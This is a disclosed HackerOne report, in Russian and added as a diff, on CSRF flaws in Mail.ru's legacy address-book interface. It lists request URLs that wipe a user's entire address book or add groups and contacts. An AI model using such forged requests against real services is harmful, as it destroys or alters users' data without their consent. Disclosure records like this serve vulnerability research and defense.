@@ -1,0 +1,18 @@
+ReportLink:https://hackerone.com/reports/232653
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/napalube
+ReportedTo:Mail.ru(mailru)
+BountyAmount:250.0
+Severity:medium
+State:Closed
+DateOfDisclosure:29.12.2017 10:59:35
+
+Summary:
+CSRF in legacy functionality allowed address book manipulation in e.mail.ru 
+Привет! Мною был обнаружен старый интерфейс управления контактами в почте: https://e.mail.ru/cgi-bin/new_absetup
+Не весь функционал там рабочий, но пару CSRF удалось найти:
+https://e.mail.ru/cgi-bin/new_absetup?remove&confirm=1 - запрос полностью стирает адресную книгу
+https://e.mail.ru/cgi-bin/new_editgroup?addgroup&group_name=test - запрос создает контакт с псевдонимом test
+https://e.mail.ru/cgi-bin/abaddfrommail?ids=1&Name_1=test&Email_1=test@mail.ru&Name1_1=test&Name2_1=test - запрос создает контакт с именем, фамилией и псевдонимом test.
+
+Стоит потереть следы старой версии и избавиться от CSRF
